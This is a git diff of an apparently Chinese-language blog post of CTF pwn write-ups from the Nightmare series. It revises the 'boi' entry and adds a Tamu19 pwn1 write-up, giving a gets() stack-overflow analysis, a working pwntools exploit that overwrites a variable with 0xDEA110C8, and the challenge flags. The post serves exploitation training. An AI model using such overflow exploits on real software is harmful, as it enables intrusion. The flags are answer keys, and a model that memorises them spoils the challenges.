@@ -1,7 +1,7 @@
 ---
 title: 'Writeups: Nightmare Series'
 date: '2024-07-24'
-lastmod: '2024-07-25'
+lastmod: '2024-07-26'
 tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
 draft: false
 summary: 'Writeups for Nightmare Series'
@@ -157,7 +157,7 @@ Flag: `flag{we_beleaf_in_your_re_future}`
 λ ~/ file boi
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
 λ ~/ pwn checksec boi
-[*] '/home/cub3y0nd/Projects/CTF/boi'
+[*] '/home/cub3y0nd/boi'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
@@ -184,7 +184,7 @@ Thu Jul 25 05:35:00 PM CST 2024
 
 下面是两种得到溢出点的方法：
 
-1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在溢出问题，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
+1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在栈溢出漏洞，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
 2. 通过调试知道溢出点是 20 (0x14)：
 
 <center>
@@ -198,6 +198,8 @@ Thu Jul 25 05:35:00 PM CST 2024
 
 from pwn import *
 
+context(os='linux', arch='amd64', log_level='debug')
+
 target = process('./boi')
 
 payload = b'A' * 0x14 + p32(0xcaf3baee)
@@ -210,3 +212,76 @@ target.interactive()
 
 Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`
 
+## Tamu19 pwn1
+
+### Information
+
+ - Category: Pwn
+ - Points: Unknow
+
+### Description
+
+> Unknow
+
+<Download name="pwn1" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tamu19_pwn1/pwn1" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file boi
+pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd
+7aa1accb16feac888c99841f504, not stripped
+λ ~/ pwn checksec pwn1
+[*] '/home/cub3y0nd/pwn1'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+```plain-text
+λ ~/ ./pwn1
+Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
+What... is your name?
+aaaa
+I don't know that! Auuuuuuuugh!
+```
+
+咋一看好像没啥东西，丢到 IDA 里面瞧瞧：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/26/pkb4IlF.png" width={1920} height={1080} />
+</center>
+
+显然，根据伪代码可以轻易的知道如何绕过前两问的输入。然后第三问采用了一个 `gets()` 函数接收输入，输入保存到一个 43 字节大小的字符数组里面。由于 `gets()` 不检查输入大小，因此超过 `input` 容量的内容会溢出到 `v5`。最后如果 `v5 == 0xDEA110C8` 则输出 `flag`。
+
+所以思路就是先回答前两问，然后填满 `input`，将 `0xDEA110C8` 溢出到变量 `v5`，结束。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+target = process('./pwn1')
+
+recvuntil = lambda str : print(target.recvuntil(str))
+
+payload = b'A' * 0x2b + p32(0xdea110c8)
+
+recvuntil(b'What... is your name?')
+target.sendline(b'Sir Lancelot of Camelot')
+recvuntil(b'What... is your quest?')
+target.sendline(b'To seek the Holy Grail.')
+recvuntil(b'What... is my secret?')
+target.sendline(payload)
+target.interactive()
+```
+
+### Flag
+
+Flag: `flag{g0ttem_b0yz}`
